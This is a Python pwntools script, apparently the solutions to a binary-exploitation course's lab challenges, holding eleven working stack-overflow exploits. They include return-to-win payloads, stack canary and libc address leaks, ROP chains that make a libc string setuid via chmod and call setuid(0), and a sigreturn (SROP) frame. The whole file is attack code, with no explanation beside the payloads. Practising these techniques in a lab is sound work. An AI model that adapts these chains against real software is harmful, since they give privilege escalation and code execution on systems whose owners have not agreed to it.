from pwn import *
import os
import time

# with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # b read@plt
    # disp/5i $rip
    # disp/60gx $rsp
    # c
    # finish
    # ''') as p:


def challenge1():
    padding = b"a"*280
    win = 0x4012dd
    payload = padding + p64(win)

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())
        p.poll(block=True)


def challenge2():
    padding = b"a"*1672
    win = b'\xf0\x12'
    payload = padding + win

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())
        p.poll(block=True)


def challenge3():
    main_offset = 0x659
    pop_rdi_offset = 0x6c3
    win_offset = 0x2f0
    padding = b"a"*1544

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.readuntil(b'Return Address: '))
        base_addr = int(p.readlineb().strip().decode(), 16) - main_offset
        pop_rdi = p64(base_addr + pop_rdi_offset)
        win = p64(base_addr + win_offset)
        payload = padding + pop_rdi + p64(0x1337) + win
        p.send(payload)
        info(p.clean())
        # p.poll(block=True)


def challenge4():
    win_offset = 0x1330
    padding = b"a"*424

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.readuntil(b'pointer rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        p.sendline(hex(rbp-0x8))
        info(p.readuntil(b'is: '))
        canary = int(p.readlineb().strip().decode(), 16)
        payload = padding + p64(canary) + b'b'*8 + p16(win_offset)
        p.send(payload)
        info(p.clean())

def challenge5():
    win1 = 0x4012bd
    win2 = 0x401305
    padding = b"a"*1032
    payload = padding + p64(win1) + p64(win2)

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())

def challenge6():
    win1 = 0x40135f
    win2 = 0x4013d6
    win3 = 0x401455
    win4 = 0x4014d4
    win5 = 0x401553
    pop_rdi = 0x4018b3
    padding = b"a"*472
    payload = (padding + 
        p64(pop_rdi) + p64(0x1) + p64(win1) +
        p64(pop_rdi) + p64(0x2) + p64(win2) +
        p64(pop_rdi) + p64(0x3) + p64(win3) +
        p64(pop_rdi) + p64(0x4) + p64(win4) +
        p64(pop_rdi) + p64(0x5) + p64(win5)
        )

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())


def challenge7():
    padding = b"a"*104
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.readuntil(b'libc is located at '))
        system_addr = int(p.readlineb().strip().decode(), 16)
        libc.address = system_addr - libc.symbols['system']
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
        rop_chain = (pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall)

        payload = padding + rop_chain
        p.send(payload)
        info(p.clean())

def challenge8():
    padding = b"a"*1448
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.readuntil(b'pointer rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        p.sendline(hex(rbp+0x8))
        info(p.readuntil(b'is: '))
        libc_start_main_addr = int(p.readlineb().strip().decode(), 16) - 243
        libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
        rop_chain = (pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall)
        payload = padding + rop_chain
        p.send(payload)
        info(p.clean())

def challenge9():
    padding = b"a"*2008
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    puts_plt = 0x4010d0 
    puts_got = 0x404020
    main = 0x4014C4
    pop_rdi = 0x401553

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.readuntil(b'rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        puts_puts = b'a'*2000 + p64(rbp) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
        p.send(puts_puts)
        info(p.readuntil(b'stored: '))
        info(p.readline())
        info(p.readline())
        addr = p.readlineb().strip()
        addr = b'\x20' + flat(addr, endian='little')
        addr = int.from_bytes(addr, "little")
        libc.address = addr - libc.symbols['puts']
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
        rop_chain = (pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall)
        p.send(b"aaa")
        info(p.clean())
        p.send(padding + rop_chain)


def challenge10():
    padding = b"a"*264
    elf = ELF(f"/challenge/{os.getenv('HOSTNAME')[7:]}")
    rop = ROP(elf)
    pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
    syscall = 0x401243
    puts = 0x400543 # ln -s /flag puts

    frame = SigreturnFrame()
    frame.rax = 90 # syscall code for chmod
    frame.rdi = puts
    frame.rsi = 0x9ed # 04755
    frame.rdx = 0
    frame.rsp = 0xdeadbeef  # so we can find it easily
    frame.rip = syscall # When the signal context is returned to registers
    
    payload = padding + p64(pop_rax) + p64(0xf) + p64(syscall) + bytes(frame)
    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        info(p.clean())
        p.sendline(payload)
        info(p.clean())


def challenge11():
    padding = b'a'*552
    win_offset = 0x1330
    libc_offset_addr = 0x37
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")

    with process([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], close_fds=False) as p:
        # get canary
        info(p.readuntil(b'pointer rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        p.sendline(hex(rbp-0x8))
        info(p.readuntil(b'is: '))
        canary = int(p.readlineb().strip().decode(), 16)
        payload = padding + p64(canary) + b'b'*8 + p8(libc_offset_addr)
        p.send(payload)
        info(p.clean())
        # get libc address and send rop_chain
        p.sendline(hex(rbp+0x8))
        info(p.readuntil(b'is: '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243
        libc.address = libc_start - libc.symbols['__libc_start_main']
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
        rop_chain = (pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall)
        p.send(padding + p64(canary) + b'b'*8 + rop_chain)


# with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[7:]}"], '''
# b read@plt
# disp/5i $rip
# disp/20gx $rsp
# c
# finish
# ''') as p:

def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge11()


if __name__ == "__main__":
    main()